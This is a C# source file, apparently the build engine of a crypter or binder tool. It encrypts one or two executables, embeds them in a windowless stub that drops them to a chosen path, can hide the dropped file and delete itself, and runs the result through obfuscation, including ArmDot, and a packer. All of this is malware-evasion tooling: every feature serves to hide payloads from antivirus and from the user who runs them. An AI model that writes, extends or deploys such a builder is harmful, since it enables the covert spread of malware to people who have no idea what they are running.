using Builder.ModulesBuilder.Builder;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace Builder.ModulesBuilder
{
    internal class BuildEngine
    {
        private static string loadLibName = EncryptEngine.GenerateRandomStr(6) + ".exe";

        public static void CompileStub(string outExeFile, string file1Path, string file2Path, string dropPath,
            bool hideFile, bool obfuscator, bool selfdelete, bool UsePatchers, string IconFile, string AssemblyFile, bool usePolymorphic)
        {
            byte[] xorKey = EncryptEngine.GenerateRandomBytes(32);

            string app1 = EncryptEngine.GenerateRandomStr(12);
            string app2 = null;
            bool hasFile2 = !string.IsNullOrEmpty(file2Path);
            
            if (hasFile2)
            {
                app2 = EncryptEngine.GenerateRandomStr(14);
            }

            try
            {
                if (!File.Exists(file1Path))
                {
                    throw new FileNotFoundException("File 1 was not found.");
                }

                if (hasFile2 && !File.Exists(file2Path))
                {
                    throw new FileNotFoundException("File 2 was not found.");
                }

                // Use polymorphic encryption if requested
                if (usePolymorphic)
                {
                    EncryptEngine.EncryptFilePolymorphic(file1Path, xorKey, app1);
                    
                    if (hasFile2)
                    {
                        EncryptEngine.EncryptFilePolymorphic(file2Path, xorKey, app2);
                }
                }
                else
                {
                EncryptEngine.EncryptFileAndSave(file1Path, xorKey, app1);
                    
                    if (hasFile2)
                    {
                EncryptEngine.EncryptFileAndSave(file2Path, xorKey, app2);
                    }
                }

                string stubSourceCode = Properties.Resources.stub;
                stubSourceCode = ReplaceStubVariables(stubSourceCode, xorKey, dropPath, 
                    Path.GetFileName(file1Path), 
                    hasFile2 ? Path.GetFileName(file2Path) : string.Empty, 
                    app1, app2, hasFile2, usePolymorphic);

                CompilerParameters compilerParams = ConfigureCompiler(loadLibName, hideFile, selfdelete);

                AddResource(compilerParams, app1);
                
                if (hasFile2)
                {
                AddResource(compilerParams, app2);
                }

                try
                {
                    CompileSource(stubSourceCode, compilerParams, loadLibName);

                    if (obfuscator && File.Exists(loadLibName))
                    {
                        ObfuscateEngine.PerformObfuscation(loadLibName);
                    }

                    // Adding ArmDot obfuscation for extra protection
                    if (File.Exists(loadLibName))
                    {
                        PerformArmDotObfuscation(loadLibName);
                    }

                    PackerEngine.PerformPacking(loadLibName, outExeFile, obfuscator, UsePatchers, IconFile, AssemblyFile);
                }

                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            finally
            {
                TempCleaner(app1, app2);
            }
        }

        private static string ReplaceStubVariables(string stubSourceCode, byte[] xorKey, string dropPath, string file1Path, string file2Path, string app1, string app2, bool hasFile2, bool usePolymorphic)
        {
            try
            {
                stubSourceCode = stubSourceCode.Replace("%PathToDrop%", dropPath)
                                               .Replace("%exe1_name%", file1Path)
                                               .Replace("%exe2_name%", file2Path)
                                               .Replace("%exe1_resource_name%", app1)
                                               .Replace("%exe2_resource_name%", hasFile2 ? app2 : string.Empty);

                // Add a conditional compilation symbol for File2
                if (hasFile2)
                {
                    stubSourceCode = stubSourceCode.Replace("// %USE_FILE2%", "#define USE_FILE2");
                }
                else
                {
                    stubSourceCode = stubSourceCode.Replace("// %USE_FILE2%", "// File2 not provided");
                }
                
                // Add conditional compilation symbol for polymorphic encryption
                if (usePolymorphic)
                {
                    stubSourceCode = stubSourceCode.Replace("// %USE_POLYMORPHIC%", "#define USE_POLYMORPHIC");
                }
                else
                {
                    stubSourceCode = stubSourceCode.Replace("// %USE_POLYMORPHIC%", "// Standard encryption");
                }

                string newKey = "public static byte[] ApplicationKey = new byte[] { " + string.Join(", ", xorKey.Select(b => "0x" + b.ToString("X2"))) + " };";
                stubSourceCode = Regex.Replace(
                    stubSourceCode,
                    @"public static byte\[\] ApplicationKey = new byte\[\] \{.*?\};",
                    newKey,
                    RegexOptions.Singleline
                );

                return stubSourceCode;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("Error to configuration stub.", ex);
            }
        }

        private static CompilerParameters ConfigureCompiler(string outputExePath, bool hideFile, bool selfdelete)
        {
            try
            {
                CompilerParameters compilerParams = new CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = outputExePath,
                    CompilerOptions = "/platform:x64 /target:winexe",
                    IncludeDebugInformation = false,
                    ReferencedAssemblies =
                    {
                        "System.dll",
                        "System.Core.dll",
                    }
                };

                if (hideFile)
                {
                    compilerParams.CompilerOptions += " /define:HideFile";
                }

                if (selfdelete)
                {
                    compilerParams.CompilerOptions += " /define:SelfRemove";
                }

                return compilerParams;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("Error configuring compiler.", ex);
            }
        }

        private static void AddResource(CompilerParameters compilerParams, string filePath)
        {
            if (File.Exists(filePath))
            {
                compilerParams.EmbeddedResources.Add(filePath);
            }
            else
            {
                throw new FileNotFoundException($"Resource not found: {filePath}");
            }
        }

        private static void CompileSource(string stubSourceCode, CompilerParameters compilerParams, string outputExePath)
        {
            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults compileResult = codeProvider.CompileAssemblyFromSource(compilerParams, stubSourceCode);

                if (compileResult.Errors.Count > 0)
                {
                    foreach (CompilerError error in compileResult.Errors)
                    {
                        Console.WriteLine($"Error {error.ErrorNumber}: {error.ErrorText}");
                    }
                    throw new InvalidOperationException("Compilation have errors.");
                }
                else
                {
                    Console.WriteLine($"Build successfull: {outputExePath}");
                }
            }
        }

        private static void TempCleaner(string file1, string file2)
        {
            try
            {
                if (File.Exists(file1)) File.Delete(file1);
                if (file2 != null && File.Exists(file2)) File.Delete(file2);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error at deleteing temporary files: {ex.Message}");
            }
        }

        private static void PerformArmDotObfuscation(string filePath)
        {
            try
            {
                string armDotPath = "path/to/ArmDot.exe"; // Replace with actual path to ArmDot executable
                if (!File.Exists(armDotPath))
                {
                    Console.WriteLine("ArmDot executable not found. Skipping ArmDot obfuscation.");
                    return;
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = armDotPath,
                    Arguments = $"obfuscate \"{filePath}\" -o \"{filePath}.obfuscated\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    if (process.ExitCode == 0)
                    {
                        Console.WriteLine("ArmDot obfuscation successful.");
                        File.Delete(filePath);
                        File.Move($"{filePath}.obfuscated", filePath);
                    }
                    else
                    {
                        Console.WriteLine($"ArmDot obfuscation failed: {output}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during ArmDot obfuscation: {ex.Message}");
            }
        }
    }
}